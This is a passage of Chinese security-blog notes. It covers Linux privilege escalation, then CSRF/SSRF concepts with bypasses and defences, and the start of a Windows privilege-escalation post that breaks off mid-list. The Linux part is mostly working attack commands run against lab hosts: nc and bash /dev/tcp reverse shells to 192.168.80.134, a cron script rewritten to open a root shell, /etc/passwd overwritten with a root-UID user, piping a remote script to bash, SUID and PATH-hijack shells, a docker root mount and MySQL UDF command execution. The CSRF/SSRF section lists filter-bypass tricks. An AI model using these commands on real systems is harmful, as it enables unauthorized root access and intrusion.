src="/2022/03/04/day38/image-20220304205911979.png" alt="image-20220304205911979"></p><p><strong>用wget将exp放入tmp内</strong></p><p><strong>chmod +x 赋予执行权限</strong></p><p><strong>./exp执行提权</strong></p><p>大概思路如上</p><h2 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h2><p>SUID是赋予文件的一种权限，它出现在文件拥有者权限的执行位上，此权限下执行时让调用者暂时获得该文件拥有者的权限。</p><p>简而言之，如果ROOT用户给某个可执行文件加了S权限，那么该执行程序运行的时候将拥有ROOT权限。</p><p>查找所有suid可执行文件的命令</p><pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null find / -user root -perm -4000-print2&gt;/dev/null find / -user root -perm -4000-exec ls -ldb {} \; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>/表示从文件系统的顶部（根）开始并找到每个目录</p><p>-perm 表示搜索随后的权限</p><p>-u = s表示查找root用户拥有的文件</p><p>-type表示我们正在寻找的文件类型</p><p>f 表示常规文件，而不是目录或特殊文件</p><p>2表示该进程的第二个文件描述符，即stderr（标准错误）</p></blockquote><p>常见suid提权文件</p><pre class="line-numbers language-none"><code class="language-none">nmap、vim、find、more、less、bash、cp、Nano、mv、awk、man、weget<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可在此网站查询suid文件的利用方法</p><pre class="line-numbers language-none"><code class="language-none">https://gtfobins.github.io/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>nc反弹shell</p><p><strong>抓包，改post方式，kali监听，bp加参数url编码提交</strong></p><pre class="line-numbers language-none"><code class="language-none">cmd=system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.80.134 8888 &gt;/tmp/f');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305131558177.png" alt="image-20220305131558177"></p><p><strong>拿到shell，python3调用本地shell改为交互式</strong></p><p><img src="/2022/03/04/day38/image-20220305131813804.png" alt="image-20220305131813804"></p><p><strong>查找suid可执行文件，并查找利用方法</strong></p><p>可看到文件比较多，</p><p><img src="/2022/03/04/day38/image-20220305132125317.png" alt="image-20220305132125317"></p><p>此文件我们可利用，查看权限确实有suid权限</p><p><img src="/2022/03/04/day38/image-20220305132219058.png" alt="image-20220305132219058"></p><p>在网站查询利用方法</p><pre class="line-numbers language-none"><code class="language-none">find . -exec /bin/sh -p \; -quit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305132317144.png" alt="image-20220305132317144"></p><p><strong>拿到root权限</strong></p><p><img src="/2022/03/04/day38/image-20220305132511629.png" alt="image-20220305132511629"></p><h2 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h2><p>如果passwd文件是可以被修改的，我们可以通过openssl passwd新增一个用户，将其提权为root用户</p><p>这里看到此文件只有读取权限没有写权限，我们这里在靶机赋予他所有权限以便我们这次演示</p><p><img src="/2022/03/04/day38/image-20220305134441637.png" alt="image-20220305134441637"></p><p><strong>cat读取passwd，在本地创建passwd文件，将靶机passwd文件内容放进去</strong></p><p><img src="/2022/03/04/day38/image-20220305134802889.png" alt="image-20220305134802889"></p><p><strong>本地openssl passwd创建用户</strong></p><pre class="line-numbers language-none"><code class="language-none">openssl passwd -1 -salt xiaoshahack a123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到，此处注意.不能忘记</p><p>$1$xiaoshah$huYTOWqYxXSnKI8m032HE.</p><p><img src="/2022/03/04/day38/image-20220305135024853.png" alt="image-20220305135024853"></p><p><strong>在本地passwd中参照root将创建的用户赋予root权限</strong></p><pre class="line-numbers language-none"><code class="language-none">xiaoshahack:$1$xiaoshah$huYTOWqYxXSnKI8m032HE.:0:0:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305135709824.png" alt="image-20220305135709824"></p><p>开启httpserver服务，在shell中用wget下载覆盖passwd</p><pre class="line-numbers language-none"><code class="language-none">wget http://192.168.80.134/passwd -O /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305135838422.png" alt="image-20220305135838422"></p><p>shell中cat此文件，发现已经被修改</p><p><img src="/2022/03/04/day38/image-20220305140303110.png" alt="image-20220305140303110"></p><p><strong>切换创建用户，即可得到root权限</strong></p><p><img src="/2022/03/04/day38/image-20220305142228896.png" alt="image-20220305142228896"></p><p>也可使用ssh连接</p><pre class="line-numbers language-none"><code class="language-none">ssh xiaoshahack@192.168.80.142<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305142400486.png" alt="image-20220305142400486"></p><h2 id="ssh密钥提权"><a href="#ssh密钥提权" class="headerlink" title="ssh密钥提权"></a>ssh密钥提权</h2><p>拿到一个反弹shell后</p><p><strong>将passwd中的bash过滤出来</strong></p><pre class="line-numbers language-none"><code class="language-none">cat /etc/passwd | grep bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305144153868.png" alt="image-20220305144153868"></p><p>拿到了一些信息，我们看其中有一些主目录，我们尝试看是否可访问这些主目录</p><p><strong>查看目录</strong></p><p><img src="/2022/03/04/day38/image-20220305144438829.png" alt="image-20220305144438829"></p><p>看到了ssh目录，<strong>查看.ssh是否可读</strong></p><p><img src="/2022/03/04/day38/image-20220305144541952.png" alt="image-20220305144541952"></p><p>看到也是可读的</p><p>存在author这个文件，author和pub这俩个文件md5值相同</p><p>所以我们可以把id_rsa这个文件下载下来，修改后，通过修改后的密钥登录</p><p>id_rsa就是这个用户登录的私钥</p><p><strong>下载并赋予id_rsa文件600权限</strong></p><p><img src="/2022/03/04/day38/image-20220305144926965.png" alt="image-20220305144926965"></p><p><strong>通过此密钥登录</strong></p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa web1@192.168.80.142<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305145024555.png" alt="image-20220305145024555"></p><p>可看到成功登录了</p><p><strong>通过一些方式提权</strong></p><p>这里权限比较低，之后我们可以看那些地方可提权，比如docker</p><p><img src="/2022/03/04/day38/image-20220305145049174.png" alt="image-20220305145049174"></p><h2 id="环境劫持提权"><a href="#环境劫持提权" class="headerlink" title="环境劫持提权"></a>环境劫持提权</h2><p>前提条件：</p><ol><li>存在带有suid的文件</li><li>suid文件中有系统命令</li></ol><p><strong>寻找suid文件</strong>，命令在suid提权写了</p><p><img src="/2022/03/04/day38/image-20220305151059944.png" alt="image-20220305151059944"></p><p>这里有一个脚本文件，我们运行这个文件看它是干什么的</p><p><strong>运行此文件</strong></p><p><img src="/2022/03/04/day38/image-20220305151209356.png" alt="image-20220305151209356"></p><p>我们发现它是一个查询进程的命令，里面肯定是用了ps命令，到此我们可确定此文件是我们要找的文件，满足俩个条件</p><p>如果此文件不可读，我们可使用命令进一步确定是否有ps命令</p><pre class="line-numbers language-none"><code class="language-none">xxd /script/shell | grep ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305151517694.png" alt="image-20220305151517694"></p><p>接下来思路是：把tmp路径加到当前环境变量，这样在访问/script/shell文件时，会优先执行tmp下的ps文件作为命令，不会执行原本文件里的，达到劫持效果</p><p>而tmp下的文件是我们精心准备的，达到提权效果</p><pre class="line-numbers language-none"><code class="language-none">cd /tmpecho "/bin/bash" &gt;pschmod 777 psecho $PATHexport PATH=/tmp:$PATH/script/shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305152335788.png" alt="image-20220305152335788"></p><p>可以看到提权成功了</p><h2 id="john破解shadow-root密文"><a href="#john破解shadow-root密文" class="headerlink" title="john破解shadow root密文"></a>john破解shadow root密文</h2><p>如果shadow文件可读，一般不可读，我们可以用john来破解其中的root密文，以此得到密码，就可以登录root用户了</p><p><img src="/2022/03/04/day38/image-20220305152956331.png" alt="image-20220305152956331"></p><p>先解压john的字典</p><pre class="line-numbers language-none"><code class="language-none">gzip -d /usr/share/wordlists/rockyou.txt.gz  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305153453285.png" alt="image-20220305153453285"></p><p>把root密文放到一个文件，用john解密</p><pre class="line-numbers language-none"><code class="language-none">john --wordlist="/usr/share/wordlists/rockyou.txt" root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305153600464.png" alt="image-20220305153600464"></p><p>可以看到破解了密文，可以进行登录了</p><h2 id="Ubuntu计划任务反弹shell提权"><a href="#Ubuntu计划任务反弹shell提权" class="headerlink" title="Ubuntu计划任务反弹shell提权"></a>Ubuntu计划任务反弹shell提权</h2><p>在root用户下，查看此目录/var/spool/cron/crontabs/root或crontab -l </p><p><img src="/2022/03/04/day38/image-20220305171356016.png" alt="image-20220305171356016"></p><p>查看日志文件</p><pre class="line-numbers language-none"><code class="language-none">tail -f /var/log/syslog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305171413454.png" alt="image-20220305171413454"></p><p>这里发现它反复执行cleanup.py文件</p><p>我们可以把此文件的内容修改，bash反弹shell，这样就在root下反弹shell，就会得到root的shell</p><p>在root下查看此文件发现此文件时任何用户可读可写的</p><p><strong>我们在普通用户下修改 文件</strong></p><p>此文件是以root用户身份执行的，所以我们让它反弹shell，得到的也会是root权限</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp; /dev/tcp/192.168.80.134/6666 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220305173403687.png" alt="image-20220305173403687"></p><pre class="line-numbers language-none"><code class="language-none">import osimport systry:    os.system('rm -r /home/web1/cleanup/*')except:    sys.exit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>监听，执行</strong></p><pre class="line-numbers language-none"><code class="language-none">tail -f /var/log/syslog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>拿到root权限</strong></p><p><img src="/2022/03/04/day38/image-20220305181410126.png" alt="image-20220305181410126"></p><h2 id="提权脚本使用"><a href="#提权脚本使用" class="headerlink" title="提权脚本使用"></a>提权脚本使用</h2><h3 id="LinEnum"><a href="#LinEnum" class="headerlink" title="LinEnum"></a>LinEnum</h3><p><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p><p>下载并执行</p><pre class="line-numbers language-none"><code class="language-none">wget -O - http://192.168.80.134/LinEnum.sh | bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306131103218.png" alt="image-20220306131103218"></p><p>可拿到很多东西，版本信息、敏感文件等等</p><h3 id="linuxprivchecker"><a href="#linuxprivchecker" class="headerlink" title="linuxprivchecker"></a>linuxprivchecker</h3><p>python2版本</p><p><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></p><p>python3版本</p><p><a href="https://github.com/swarley7/linuxprivchecker">https://github.com/swarley7/linuxprivchecker</a></p><p>wget拉取，执行</p><pre class="line-numbers language-none"><code class="language-none">python3 linuxprivchecker.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306131640649.png" alt="image-20220306131640649"></p><p>也会获得很多信息</p><h3 id="linux-exploit-suggester2"><a href="#linux-exploit-suggester2" class="headerlink" title="linux-exploit-suggester2"></a>linux-exploit-suggester2</h3><p><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></p><p>自动检测</p><pre class="line-numbers language-none"><code class="language-none">perl linux-exploit-suggester-2.pl -k 版本<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306132018230.png" alt="image-20220306132018230"></p><h2 id="docker提权"><a href="#docker提权" class="headerlink" title="docker提权"></a>docker提权</h2><p>docker是一个容器，可以在一台机子下虚拟多台服务，比如在linux下虚拟一个linux</p><p>拿到一个反弹shell可以 id 或 groups查看是否有docker组</p><p>比如我们在ssh提权中登入一个用户发现了docker，就可以进行docker提权</p><p><img src="/2022/03/04/day38/image-20220306133656576.png" alt="image-20220306133656576"></p><p>思路就是把docker的目录挂载到宿主根目录，即可拿到root权限</p><pre class="line-numbers language-none"><code class="language-none">docker run -v /:/mnt -it alpine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入docker的mnt下就是宿主的根目录，这里的alpine会自动在网上查找下载</p><p><img src="/2022/03/04/day38/image-20220306134046533.png" alt="image-20220306134046533"></p><h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>sudo 是一种权限管理机制，管理员可授权普通用户在不知道root密码情况下去执行一些 root 执行的操作。</p><p>首先通过信息收集，查看是否存在sudo配置不当的可能。如果存在，寻找低权限sudo用户的密码，进而提权。</p><p>通常运维会将一些需要 sudo的命令集成到某个用户或者某个组，然后在/etc/sudoers文件内进行设置</p><p>可设置 chmod +w cat /etc/sudoers 使用vi对其编辑 保存即可</p><p>一个思路：</p><p>当我们登入一些普通用户，可以sudo -l 列出可执行的命令</p><p><img src="/2022/03/04/day38/image-20220306135921127.png" alt="image-20220306135921127"></p><p>可看到我们在sudo下可以执行cat命令</p><p>可读取shadow文件</p><p><img src="/2022/03/04/day38/image-20220306140132400.png" alt="image-20220306140132400"></p><p>拿到一些密文可进行解密，比如root的密文</p><h2 id="mysql-udf提权"><a href="#mysql-udf提权" class="headerlink" title="mysql udf提权"></a>mysql udf提权</h2><p>在windows我们也说过这种方法</p><p>这总方法成功率不大，因为限制条件比较多</p><p>失败的原因：</p><ol><li><p>plugin 不存在 或者 没权限写入文件</p></li><li><p>udf so文件 版本不对</p></li><li><p>设置了权限</p><pre class="line-numbers language-none"><code class="language-none">sudo ln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><p>拿到反弹shell后，mysql –version查看是否有mysql</p><p><img src="/2022/03/04/day38/image-20220306143831903.png" alt="image-20220306143831903"></p><p>假如此时知道账号密码 登入 ，查看是否有插件文件夹</p><pre class="line-numbers language-none"><code class="language-none">show variables like '%plugin%';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306143956594.png" alt="image-20220306143956594"></p><p>查看此路径目录权限，是否有写权限</p><p><img src="/2022/03/04/day38/image-20220306144106066.png" alt="image-20220306144106066"></p><p>在sqlmap此路径下存在此文件，这个文件是编译过的</p><pre class="line-numbers language-none"><code class="language-none">/usr/share/sqlmap/data/udf/mysql/linux/64/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306144434739.png" alt="image-20220306144434739"></p><p>我们将此文件解码后wget到plung目录下</p><pre class="line-numbers language-none"><code class="language-none">cd /usr/share/sqlmap/extra/cloak/ 进入此目录下sudo python cloak.py -d -i /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ lib_mysqludf_sys.so 使用cloak.py进行解码cp /usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ ~/Desktop 将解码后的文件拿到桌面wget http://192.168.80.134/lib_mysqludf_sys.so在pllung中拿此文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306144853376.png" alt="image-20220306144853376"></p><p>登入mysql，创建函数</p><pre class="line-numbers language-none"><code class="language-none">create function sys_eval returns string soname "lib_mysqludf_sys.so";<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用创建函数执行命令</p><pre class="line-numbers language-none"><code class="language-none">select sys_eval('id');<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/04/day38/image-20220306151245805.png" alt="image-20220306151245805"></p><p>一个思路</p><h2 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h2><p>登入一个用户下，我们在tmp下建立1.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; int main(int argc,char *argv[]) {setreuid(1001,1001); execve("/bin/sh",NULL,NULL); }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用gcc编译</p><pre class="line-numbers language-none"><code class="language-none">gcc 1.c -o 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加suid</p><pre class="line-numbers language-none"><code class="language-none">chmod u+s 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加了suid之后其他用户就可以调用</p><p>./1运行，可bash切换到bashshell</p><p>运行后即可执行1001这个用户id的sudo cat命令</p><p><img src="/2022/03/04/day38/image-20220306154132663.png" alt="image-20220306154132663"></p>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>csrfssrf</title>
      <link href="/2022/01/02/csrfssrf/"/>
      <url>/2022/01/02/csrfssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="csrf-amp-ssrf"><a href="#csrf-amp-ssrf" class="headerlink" title="csrf&amp;ssrf"></a>csrf&amp;ssrf</h1><span id="more"></span><h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><p>跨站请求伪造，伪装成受信任用户的来利用受信任的网站</p><p>检测：抓包，修改referfer字段重新提交，如果正常可能存在此漏洞</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>盗用受害者的身份，做受害者能做的事</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在用户浏览器网站的cookie没有过期时，攻击者发送csrf脚本，从而盗用用户身份</p><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>只要不关闭浏览器或者退出登录，网站的cookie在浏览器中不会过期。在这个期间，攻击者发送了构造好的csrf 脚本或包含csrf脚本的链接，从而让用户进行一些未经允许的操作。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><ol><li><p>未进行token检验</p><p>csrf高发处</p></li><li><p>json劫持</p><ol><li><p>如果服务端没有校验Content-Type，或者没有严格校验Content-Type是否为application /json，我们可以使用XHR来实现csrf。 </p></li><li><p>使用XMLHttpRequest、fetch能构造出JSON请求，并且能设置Content-Type，但是无法跨域。</p></li></ol></li><li><p>flash csrf</p><p>Flash里的ActionScript脚本也是客户端脚本，同样可以进行一些操作。以Flash为载体， 进行一些隐秘的攻击。</p></li></ol><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ol><li><p>验证码</p><p>与用户交互，验证身份</p></li><li><p>referer check</p><p>如果不是操作页面或者网站的域(验证referfer)</p></li><li><p>token校验</p><p>以参数形式加入一个随机数token，并在服务器端建立一个拦截器来验证这个token</p></li></ol><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol><li><p>Referer为空 </p><p>利用ftp://,http://,https://,file://,javascript:,data:这个时候浏览器地址栏是 file://开头的，如果这个HTML页面向任何http站点提交请求的话，这些请求的Referer都是空的。  </p></li><li><p>判断Referer是某域情况下绕过</p><p> 比如你找的csrf是xxx.com  验证的referer是验证的*.xx.com  可以找个二级域名 之后</p><p>&lt;img “csrf地址”&gt; </p><p>之后在把文章地址发出去 就可以伪造。  </p></li><li><p>判断Referer是否存在某关键词</p><p> referer判断存在不存在google.com这个关键词，在网站新建一个google.com目录  把CSRF存放在google.com目录,即可绕过  </p></li><li><p>判断referer是否有某域名 </p><p>判断了Referer开头是否以126.com以及126子域名  不验证根域名为126.com 那么我这里可以 构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</p></li></ol><h3 id="xss与csrf区别"><a href="#xss与csrf区别" class="headerlink" title="xss与csrf区别"></a>xss与csrf区别</h3><p>XSS<strong>利用</strong>站点内的信任用户，而CSRF则<strong>伪装</strong>来自受信任用户的请求来利用受信任的网站。</p><p>xss针对客户端，csrf针对服务端。</p><p>csrf局限性更小，能做到的事更多</p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>服务端请求伪造，攻击者构造代码导致服务端发起漏洞利用请求</p><p>SSRF漏洞一般为HTTP／HTTPS方式出现，但类似TCP Connect方式也可以探测内网的IP活跃状态和端口的开放情况，但此类危害较小。</p><p>产生漏洞的函数：</p><ul><li>file_get_contents()</li><li>fsockopen()</li><li>curl_exec()</li></ul><h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><p>服务端需要从其他服务器获取数据，但是<strong>没有对其目标地址做过滤和限制</strong>，导致攻击者可以利用此缺陷访问任意服务器资源，其中就包括外网无法访问的内网资源。</p><h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><ol><li>对目标服务器所在的内网进行<strong>IP存活性扫描和端口扫描</strong></li><li>利用<strong>扫描的指纹信息</strong>判断开放的服务，从而对内网的主机进行攻击</li><li><strong>识别内网WEB应用指纹</strong>，判断应用类型进行攻击</li><li>使用特定协议攻击应用（gopher、dict、file、FTP／SFTP等）</li></ol><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>特殊域名绕过</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1.xip.io/# 会解析到本地的127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他进制绕过或缩写</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.18进制格式：0177.0.0.116进制格式：0x7F.0.0.110进制整数格式：2130706433（转16进制，在转10进制）16进制整数格式：0x7F000001省略模式，例如127.0.0.1这个IP可以写成127.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>句号代替点</p><pre class="line-numbers language-none"><code class="language-none">127.0.0.1 变为127。0。0。1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>短地址绕过</p><pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1可以变为http://suo.im/5UHEvD# 转换地址有很多，可以采用http://tool.chinaz.com/tools/dwz.aspx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用@绕过</p><pre class="line-numbers language-none"><code class="language-none">http://example.com@127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li><strong>禁止302跳转</strong>，或者没跳转一次都进行<strong>校验目的地址</strong>是否为内网地址或合法地址。</li><li>过滤返回信息，验证远程服务器对请求的返回结果是否合法。</li><li><strong>禁用高危协议</strong>，例如：gopher、dict、ftp、file等，只允许http/https</li><li>设置URL<strong>白名单</strong>或者限制内网IP</li><li><strong>限制请求的端口</strong>为http的常用端口，或者根据业务需要治开放远程调用服务的端口</li><li>catch错误信息，做<strong>统一错误信息</strong>，避免黑客通过错误信息判断端口对应的服务</li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
          <category> 绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csrf </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权</title>
      <link href="/2021/12/28/day37/"/>
      <url>/2021/12/28/day37/</url>
      
        <content type="html"><![CDATA[<h1 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h1><span id="more"></span><h2 id="windows基础知识"><a href="#windows基础知识" class="headerlink" title="windows基础知识"></a>windows基础知识</h2><p>一些windows指令在15-1中具体写了</p><h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><p>在windows不用的用户有着不同的权限，权限主要包括有：完全控制、修改、读取和执行、列出文件夹内容、读取、写入。</p><p>超级管理员和system用户权限最高</p><p><strong>内置用户：</strong></p><ul><li>Administrator，系统管理员账号，拥有完全控制权</li><li>guest，来宾账号，提供访问共享资源的网络用户使用，仅具有基本权限，默认被禁用</li></ul><p>用户也可以属于多个用户组，常见的用户组是 管理组(Administrators)、普通用户组（Users）、iis用户组（IIS_IUSRS）、来宾组（Guests）、远程登录组（Remote Desktop Users）</p><p><strong>内置用户组：</strong></p><ul><li>administrators，管理员组</li><li>users组，新建用户默认所属的组</li><li>guests组，权限最低</li><li>iis_users组 Internet 信息服务使用的内置组。</li></ul><p><strong>用户信息的详细解析：</strong></p><p>whoami指令</p><pre class="line-numbers language-none"><code class="language-none">whoami /?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入whoami /?会出现以下信息</p><pre class="line-numbers language-none"><code class="language-none">WhoAmI 有三种使用方法:语法 1:    WHOAMI [/UPN | /FQDN | /LOGONID]语法 2:    WHOAMI { [/USER] [/GROUPS] [/CLAIMS] [/PRIV] } [/FO format] [/NH]语法 3:    WHOAMI /ALL [/FO format] [/NH]描述:    这个工具可以用来获取本地系统上当前用户(访问令牌)的用户名和组信息，    以及相应的安全标识符(SID)、声明、    本地系统上当前用户的权限、登录标识符(登录 ID)    。例如，谁是当前已登录的用户?    用户名。参数列表:    /UPN                    用用户主体 (User Principal) 格式显示用户名                            名称 (UPN)格式。    /FQDN                   用完全合格的 (Fully Qualified) 格式显示用户名                            可分辨名称(FQDN) 格式。    /USER                   显示当前用户的信息以及安全标识符 (SID)。    /GROUPS                 显示当前用户的组成员信息、帐户类型和安全                            标识符 (SID) 和属性。    /CLAIMS                 显示当前用户的声明，                            包括声明名称、标志、类型和值。    /PRIV                   显示当前用户的安全特权                            。    /LOGONID               显示当前用户的登录 ID。    /ALL                    显示当前用户名、所属的组                            以及安全等级                            当前用户访问令牌的标识符(SID)、                            声明和权限。    /FO       format        指定要显示的输出格式。                            有效值为 TABLE、LIST、CSV。                            列标题未使用 CSV                            格式显示。默认格式为 TABLE。    /NH                     指定不应在输出中显示                            列标题。此参数仅对                            TABLE 和 CSV 格式有效。    /?                     显示此帮助消息。Examples:    WHOAMI    WHOAMI /UPN    WHOAMI /FQDN    WHOAMI /LOGONID    WHOAMI /USER    WHOAMI /USER /FO LIST    WHOAMI /USER /FO CSV    WHOAMI /GROUPS    WHOAMI /GROUPS /FO CSV /NH    WHOAMI /CLAIMS    WHOAMI /CLAIMS /FO LIST    WHOAMI /PRIV    WHOAMI /PRIV /FO TABLE    WHOAMI /USER /GROUPS    WHOAMI /USER /GROUPS /CLAIMS /PRIV    WHOAMI /ALL    WHOAMI /ALL /FO LIST    WHOAMI /ALL /FO CSV /NH    WHOAMI /?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows的sid详解"><a href="#windows的sid详解" class="headerlink" title="windows的sid详解"></a>windows的sid详解</h2><p>windows的安全性主要依赖于几个基本元素：访问令牌、SID、安全描述符、访问控制表、密码。</p><p>访问令牌：访问令牌在本质上定义了两 上“P”：Permissions（权限）和Privilege（特权）。两者区别并不明显。访问令牌的内容和功能由用户的SID、组的SID、登录 SID、用户特权、默认所有者、SID、默认组SID、默认DACL、起源进程、令牌类型、模拟级别、受限SID。</p><p>权限：一个用户进程在接触一个对象时，“安全性参考监视器”将访问令牌中的SID与“对象访问控制列表（ACL）”中的SID匹配。可能出现的两种情况：</p><ol><li>如果没有匹配，就拒绝用户访问，这称为“隐式拒绝（implici deny）”;</li><li>如果有一个区配，就将与ACK中的条目关联的权限授予给用户。</li></ol><p>这可能是Allow,也可能是一个Deny权限。在两个权限都直接指派给对象的前提下，Deny权限将优先于Allow权限（在对待继承的权限时，采取的方式稍有不同）</p><p> SID：一个典型的SID：S－1-5-21-1683771068-12213551888-624655398-1001。它遵循的模式是：S－R－IA－SA－SA－RID。下面是具体解释：</p><ol><li><p>  字母S指明这是一个SID标识符，它将数字标记为一个SID。</p></li><li><p>  R代表Revision（修订），Windows生成的所有SID都使用修订级别 1。</p></li><li><p>  IA代表颁发机构。在Widnwos中，几乎所有SID都指定NT机构作为颁发机构，它的ID编号为5.但是，代表已知组和账户的SID例外。</p></li><li><p>  SA代表一个子机构。SA指定特殊的组或职能。</p></li></ol><p>   例如、21表明SID由一个域控制器或者一台单机颁发。随后的一长串数字（1683771068-12213551888-624655398）就是颁发SID的那个域或机器的SA。</p><ol start="5"><li>  